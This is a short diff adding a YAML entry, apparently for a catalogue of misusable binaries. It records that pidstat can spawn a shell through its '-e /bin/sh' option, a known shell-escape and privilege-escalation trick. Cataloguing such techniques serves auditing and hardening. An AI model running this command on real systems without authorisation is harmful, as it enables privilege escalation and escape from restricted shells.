@@ -1,0 +1,4 @@
+name: pidstat
+binary_path: /usr/bin/pidstat
+exploit_cmds:
+- /usr/bin/pidstat -e /bin/sh -p
